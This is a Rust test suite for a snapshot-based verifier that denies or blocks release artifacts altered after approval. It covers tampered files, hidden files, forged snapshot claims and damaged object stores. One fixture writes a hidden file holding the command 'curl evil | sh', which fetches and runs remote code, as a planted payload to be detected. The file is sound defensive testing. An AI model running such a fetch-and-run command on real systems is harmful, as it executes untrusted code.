//! Content-addressed filesystem state: a snapshot is the only trusted
//! observation; everything after it is verification of hashed objects.
//!
//! Invariant: "artifact matches approved snapshot" =
//! `matches_snapshot(dist, A) = true`, where A was taken at approval.

use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Once;

use uuid::Uuid;
use v9r_core::fs_raw::RawFsObserver;
use v9r_core::git::GitRepo;
use v9r_core::git_provider::GitEvidenceProvider;
use v9r_core::graph::{self, Answer, Attestor, EvidenceProvider, Key, Registry, Term, Trust};
use v9r_core::kernel::{Evidence, Invariant, Obligation, Phase, Requirement, Strength, Verdict};
use v9r_core::snapshot::{
    FsSnapshot, MatchesSnapshot, ObjectStore, SnapshotCommitEquality, SnapshotObjects, IDENTITY,
};
use v9r_core::verifiers::{GitObjects, MANIFEST};

// ------------------------------------------------------------ invariant

#[derive(Clone, Debug, PartialEq, Eq)]
struct Release {
    approved: String,
}

const DIST: &str = "dist";
const INV: &str = "artifact_matches_approved_snapshot";

struct MatchesApproved;

impl Invariant<Release, Key, Term> for MatchesApproved {
    fn id(&self) -> &str {
        INV
    }
    fn obligations(&self, r: &Release) -> Vec<Obligation<Key, Term>> {
        vec![Obligation {
            invariant: INV.into(),
            phase: Phase::Pre,
            requirement: Requirement::Fact {
                subject: Key::new("matches_snapshot", [DIST, r.approved.as_str()]),
                value: Term::Bool(true),
                strength: Strength::Hard,
            },
        }]
    }
}

// ------------------------------------------------------------ environment

static HERMETIC: Once = Once::new();

fn git(dir: &Path, args: &[&str]) -> String {
    HERMETIC.call_once(|| {
        for (key, value) in [
            ("GIT_CONFIG_NOSYSTEM", "1"),
            ("GIT_CONFIG_GLOBAL", "/dev/null"),
            ("GIT_AUTHOR_NAME", "agent"),
            ("GIT_AUTHOR_EMAIL", "agent@example.invalid"),
            ("GIT_COMMITTER_NAME", "agent"),
            ("GIT_COMMITTER_EMAIL", "agent@example.invalid"),
            ("GIT_AUTHOR_DATE", "2026-01-01T00:00:00Z"),
            ("GIT_COMMITTER_DATE", "2026-01-01T00:00:00Z"),
        ] {
            std::env::set_var(key, value);
        }
    });
    let out = Command::new("git")
        .args(args)
        .current_dir(dir)
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8(out.stdout).unwrap().trim().to_string()
}

/// README, src/lib.txt, src.txt, an executable script, a symlink, an
/// empty dir.
fn populate(root: &Path) {
    fs::create_dir_all(root.join("src")).unwrap();
    fs::create_dir_all(root.join("empty")).unwrap();
    fs::write(root.join("README"), "readme\n").unwrap();
    fs::write(root.join("src/lib.txt"), "library\n").unwrap();
    // git orders "src.txt" before the tree "src" ('.' < '/').
    fs::write(root.join("src.txt"), "sources\n").unwrap();
    fs::write(root.join("run.sh"), "#!/bin/sh\necho hi\n").unwrap();
    fs::set_permissions(root.join("run.sh"), fs::Permissions::from_mode(0o755)).unwrap();
    std::os::unix::fs::symlink("src/lib.txt", root.join("link")).unwrap();
}

/// Registrations of the filesystem's witnesses for one scenario.
type Observers = Vec<Box<dyn FnOnce(&Registry)>>;

struct Env {
    base: PathBuf,
    work: PathBuf,
    store: ObjectStore,
}

impl Env {
    fn new(name: &str) -> Self {
        let base = std::env::temp_dir().join(format!("v9r-cas-{name}-{}", Uuid::new_v4()));
        let work = base.join("work");
        populate(&work.join(DIST));
        Self {
            base,
            work,
            store: ObjectStore::new(),
        }
    }

    fn dist(&self, rel: &str) -> PathBuf {
        self.work.join(DIST).join(rel)
    }

    fn observer(&self, id: &str) -> RawFsObserver {
        RawFsObserver::new(id, &self.work)
    }

    /// The pieces every scenario shares: the store (untrusted) and the
    /// verifiers, with `observers` as the filesystem's only witnesses.
    fn registry_with(&self, observers: Observers, defs: &[&str]) -> Registry {
        let registry = Registry::new();
        for add in observers {
            add(&registry);
        }
        registry.register(self.store.clone(), Trust::ClaimsOnly);
        registry.add_verifier(FsSnapshot::new(self.store.clone()));
        registry.add_verifier(SnapshotObjects);
        registry.add_verifier(GitObjects);
        registry.add_verifier(SnapshotCommitEquality);
        for def in defs {
            registry.add_verifier(MatchesSnapshot::new(def));
        }
        registry
    }

    fn registry(&self) -> Registry {
        let fs = self.observer("fs");
        self.registry_with(
            vec![Box::new(move |r| {
                r.register(fs, Trust::Attesting);
            })],
            &[IDENTITY],
        )
    }

    /// Approval: snapshot `dist` now; the root id is the approved artifact.
    fn approve(&self) -> String {
        match self.registry().query(&Key::new("snapshot", [DIST])) {
            Some(Term::Id(root)) => root,
            other => panic!("approval snapshot: {other:?}"),
        }
    }
}

impl Drop for Env {
    fn drop(&mut self) {
        let _ = Command::new("chmod")
            .args(["-R", "u+rwx"])
            .arg(&self.base)
            .status();
        let _ = fs::remove_dir_all(&self.base);
    }
}

async fn verdict(registry: &Registry, approved: &str) -> (Verdict, String) {
    let result = graph::runtime(registry.clone(), vec![Box::new(MatchesApproved)])
        .authorize(Release {
            approved: approved.to_string(),
        })
        .await
        .unwrap();
    (result.verdict(), result.decision().to_string())
}

fn verified(registry: &Registry, key: &Key) -> Option<(Term, String, String)> {
    registry
        .collect(&[key])
        .get(key)
        .iter()
        .find_map(|e| match e {
            Evidence::Verified { value, provenance } => Some((
                value.clone(),
                provenance.observer.clone(),
                provenance.basis.clone(),
            )),
            _ => None,
        })
}

fn discarded(registry: &Registry, needle: &str) -> bool {
    registry
        .discarded()
        .iter()
        .any(|d| d.reason.contains(needle))
}

// ------------------------------------------------------------ ALLOW

#[tokio::test]
async fn artifact_matching_the_approved_snapshot_is_allowed() {
    let env = Env::new("allow");
    let approved = env.approve();
    let registry = env.registry();
    let (verdict, decision) = verdict(&registry, &approved).await;
    assert_eq!(verdict, Verdict::Allow, "{decision}");

    // The live state rests on the observer…
    let (_, by, basis) = verified(&registry, &Key::new("snapshot", [DIST])).unwrap();
    assert_eq!(by, "verifier:fs-snapshot");
    assert!(basis.ends_with("trusts provider:fs"), "{basis}");
    // …the approved snapshot on nothing but its objects.
    let (_, by, basis) =
        verified(&registry, &Key::new("snapshot_valid", [approved.as_str()])).unwrap();
    assert_eq!(by, "verifier:snapshot-objects");
    assert!(basis.ends_with("trusts no observer"), "{basis}");
}

#[tokio::test]
async fn a_snapshot_is_the_git_tree_of_the_same_content() {
    let env = Env::new("git-model");
    let approved = env.approve();
    for format in ["sha256", "sha1"] {
        let repo = env.base.join(format!("repo-{format}"));
        fs::create_dir_all(&repo).unwrap();
        git(&repo, &["init", "-q", &format!("--object-format={format}")]);
        populate(&repo);
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-q", "-m", "release"]);
        let commit = git(&repo, &["rev-parse", "HEAD"]);
        let tree = git(&repo, &["rev-parse", "HEAD^{tree}"]);
        if format == "sha256" {
            // Same content, same object: git computes the snapshot's id.
            assert_eq!(tree, approved);
        }
        let registry = env.registry();
        registry.register(
            GitEvidenceProvider::new(
                "git",
                &env.base,
                vec![GitRepo {
                    path: format!("repo-{format}"),
                    bare: false,
                }],
            ),
            Trust::ClaimsOnly,
        );
        let key = Key::new(
            "snapshot_matches_commit",
            [approved.as_str(), &format!("repo-{format}"), &commit],
        );
        let (value, _, basis) = verified(&registry, &key).unwrap();
        assert_eq!(value, Term::Bool(true), "{format}");
        // Relating a filesystem snapshot to a commit needs no observer.
        assert!(
            basis.ends_with("trusts verifier:git-objects, verifier:snapshot-objects"),
            "{basis}"
        );
        let inner = verified(
            &registry,
            &Key::new("snapshot_digest", [approved.as_str(), MANIFEST]),
        )
        .unwrap()
        .2;
        assert!(inner.ends_with("trusts no observer"), "{inner}");
    }
}

// ------------------------------------------------------------ DENY

#[tokio::test]
async fn file_modified_after_snapshot_is_denied() {
    let env = Env::new("modified");
    let approved = env.approve();
    fs::write(env.dist("src/lib.txt"), "backdoor\n").unwrap();
    let registry = env.registry();
    let (verdict, decision) = verdict(&registry, &approved).await;
    assert_eq!(verdict, Verdict::Deny, "{decision}");
    // What was approved is still fully verifiable: it no longer depends on
    // the directory it was taken from.
    assert_eq!(
        verified(&registry, &Key::new("snapshot_valid", [approved.as_str()])).map(|v| v.0),
        Some(Term::Bool(true))
    );
}

/// Answers the derived `snapshot` kind directly with the approved id.
struct SnapshotLiar(String);

impl EvidenceProvider for SnapshotLiar {
    fn id(&self) -> &str {
        "liar"
    }
    fn answers(&self, key: &Key) -> bool {
        key.kind == "snapshot"
    }
    fn provide(&self, keys: &[&Key], attestor: &Attestor) -> Vec<Answer> {
        keys.iter()
            .map(|k| {
                Answer::Verified(attestor.attest(
                    (*k).clone(),
                    Term::Id(self.0.clone()),
                    "trust me",
                ))
            })
            .collect()
    }
}

#[tokio::test]
async fn a_claimed_snapshot_id_is_recomputed_not_believed() {
    let env = Env::new("liar");
    let approved = env.approve();
    fs::write(env.dist("README"), "changed\n").unwrap();
    let registry = env.registry();
    registry.register(SnapshotLiar(approved.clone()), Trust::Attesting);
    let (verdict, decision) = verdict(&registry, &approved).await;
    assert_eq!(verdict, Verdict::Deny, "{decision}");
    assert!(discarded(&registry, "derivation mismatch"));
}

// ------------------------------------------------------------ BLOCKED: incomplete

#[tokio::test]
async fn unreadable_file_makes_the_snapshot_incomplete() {
    let env = Env::new("unreadable");
    let approved = env.approve();
    fs::set_permissions(env.dist("src/lib.txt"), fs::Permissions::from_mode(0o000)).unwrap();
    let registry = env.registry();
    let (verdict, decision) = verdict(&registry, &approved).await;
    assert_eq!(verdict, Verdict::Blocked, "{decision}");
    assert!(discarded(
        &registry,
        "no observation of fs_file(dist/src/lib.txt)"
    ));
}

#[tokio::test]
async fn approved_snapshot_with_a_lost_or_altered_object_is_incomplete() {
    // The blob of src/lib.txt as approved.
    let victim = v9r_core::state::ContentHash::of(b"blob 8\0library\n").to_hex();
    for mode in ["lost", "altered"] {
        let env = Env::new(mode);
        let approved = env.approve();
        assert!(env.store.ids().contains(&victim));
        let damage = || {
            if mode == "lost" {
                env.store.remove(&victim);
            } else {
                env.store.overwrite(&victim, b"blob 8\0backdoor".to_vec());
            }
        };
        // Content-addressed repair: while the live directory still has that
        // content, re-snapshotting it regenerates the very same object.
        damage();
        assert_eq!(
            verdict(&env.registry(), &approved).await.0,
            Verdict::Allow,
            "{mode}"
        );
        // Once the content exists nowhere else, the approval cannot be
        // verified, and nothing compared with it can be judged.
        fs::write(env.dist("src/lib.txt"), "changed\n").unwrap();
        damage();
        let registry = env.registry();
        let (verdict, decision) = verdict(&registry, &approved).await;
        assert_eq!(verdict, Verdict::Blocked, "{mode}: {decision}");
        assert!(
            discarded(&registry, &format!("object {victim} not supplied"))
                || discarded(&registry, &format!("no supplied bytes hash to {victim}"))
        );
    }
}

// ------------------------------------------------------------ BLOCKED: hidden entries

/// An observer that leaves out names beginning with '.'.
struct NaiveObserver(RawFsObserver);

impl EvidenceProvider for NaiveObserver {
    fn id(&self) -> &str {
        "fs"
    }
    fn answers(&self, key: &Key) -> bool {
        self.0.answers(key)
    }
    fn provide(&self, keys: &[&Key], attestor: &Attestor) -> Vec<Answer> {
        self.0
            .provide(keys, attestor)
            .into_iter()
            .map(|answer| match answer {
                Answer::Verified(a) if a.fact().subject.kind == "fs_dir" => {
                    let Term::Map(mut listing) = a.fact().value.clone() else {
                        unreachable!()
                    };
                    listing.retain(|name, _| !name.starts_with('.'));
                    Answer::Verified(attestor.attest(
                        a.fact().subject.clone(),
                        Term::Map(listing),
                        "syscall",
                    ))
                }
                other => other,
            })
            .collect()
    }
}

fn naive(env: &Env, with_independent_observer: bool) -> Registry {
    let naive = NaiveObserver(env.observer("fs"));
    let second = env.observer("fs-2");
    let mut observers: Observers = vec![Box::new(move |r| {
        r.register(naive, Trust::Attesting);
    })];
    if with_independent_observer {
        observers.push(Box::new(move |r| {
            r.register(second, Trust::Attesting);
        }));
    }
    env.registry_with(observers, &[IDENTITY])
}

#[tokio::test]
async fn hidden_directory_omitted_by_the_observer_blocks() {
    let env = Env::new("hidden-dir");
    let approved = env.approve();
    fs::create_dir_all(env.dist(".cache")).unwrap();
    fs::write(env.dist(".cache/payload"), "x").unwrap();
    // One observer only: the directory's own link count betrays the omission.
    let registry = naive(&env, false);
    let (verdict, decision) = verdict(&registry, &approved).await;
    assert_eq!(verdict, Verdict::Blocked, "{decision}");
    assert!(discarded(
        &registry,
        "link count 5 implies 3 subdirectories, listing shows 2"
    ));
}

#[tokio::test]
async fn hidden_file_omitted_by_the_observer_blocks_only_with_an_independent_observer() {
    let env = Env::new("hidden-file");
    let approved = env.approve();
    fs::write(env.dist(".payload"), "curl evil | sh\n").unwrap();
    // One observer: nothing in a directory counts its files. False ALLOW.
    assert_eq!(
        verdict(&naive(&env, false), &approved).await.0,
        Verdict::Allow
    );
    // Two observers: their listings disagree, nothing can be built.
    let registry = naive(&env, true);
    let (verdict, decision) = verdict(&registry, &approved).await;
    assert_eq!(verdict, Verdict::Blocked, "{decision}");
    assert!(discarded(
        &registry,
        "contradictory observations of fs_dir(dist)"
    ));
}

// ------------------------------------------------------------ BLOCKED: two definitions

#[tokio::test]
async fn two_definitions_of_content_that_disagree_block() {
    let env = Env::new("definitions");
    let approved = env.approve();
    // Same bytes, new mode: is that the same content?
    fs::set_permissions(env.dist("README"), fs::Permissions::from_mode(0o755)).unwrap();
    let with = |defs: &[&str]| {
        let fs = env.observer("fs");
        env.registry_with(
            vec![Box::new(move |r| {
                r.register(fs, Trust::Attesting);
            })],
            defs,
        )
    };
    assert_eq!(
        verdict(&with(&[IDENTITY]), &approved).await.0,
        Verdict::Deny
    );
    assert_eq!(
        verdict(&with(&[MANIFEST]), &approved).await.0,
        Verdict::Allow
    );
    let (verdict, decision) = verdict(&with(&[IDENTITY, MANIFEST]), &approved).await;
    assert_eq!(verdict, Verdict::Blocked, "{decision}");
    assert!(decision.contains("contradictory"));
}

#[test]
fn snapshot_code_names_no_live_path_after_creation() {
    // Only FsSnapshot (creation) may ask for primitive observations.
    let source = include_str!("../src/snapshot.rs");
    let after_creation = source
        .split("// ------------------------------------------------------------ pure verification")
        .nth(1)
        .unwrap();
    for kind in ["fs_dir", "fs_stat", "fs_file", "fs_link"] {
        assert!(!after_creation.contains(kind), "{kind}");
    }
}
